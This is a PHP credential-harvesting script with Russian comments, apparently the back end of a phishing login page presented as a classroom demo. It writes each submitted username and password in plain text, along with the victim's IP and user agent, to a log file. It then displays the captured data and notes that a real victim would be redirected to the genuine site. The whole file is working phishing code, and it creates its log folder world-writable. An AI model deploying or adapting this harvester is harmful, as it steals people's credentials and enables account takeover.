<?php
// Создаем папку для логов если её нет
if (!file_exists('logs')) {
    mkdir('logs', 0777, true);
}

// Получаем данные
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Формируем запись в лог
$log_entry = date('Y-m-d H:i:s') . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . " | Login: " . $username . " | Password: " . $password . PHP_EOL;

// Сохраняем в файл
file_put_contents('logs/access.log', $log_entry, FILE_APPEND | LOCK_EX);

// Для демонстрации показываем что перехватили
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Данные получены</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>✅ Данные получены</h1>
            <p class="subtitle">Учебный перехват трафика</p>
            
            <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 20px 0;">
                <p><strong>Логин:</strong> <?php echo htmlspecialchars($username); ?></p>
                <p><strong>Пароль:</strong> <?php echo htmlspecialchars($password); ?></p>
                <p><strong>IP жертвы:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
                <p><strong>Время:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
            </div>
            
            <p>Эти данные сохранены в <code>/var/www/html/logs/access.log</code></p>
            <p style="margin-top: 20px;">
                <a href="index.html" style="color: #667eea;">← Вернуться на главную</a>
            </p>
            
            <div class="warning">
                ⚠️ В реальной жизни жертву перенаправили бы на страницу ошибки или настоящий сайт
            </div>
        </div>
    </div>
</body>
</html>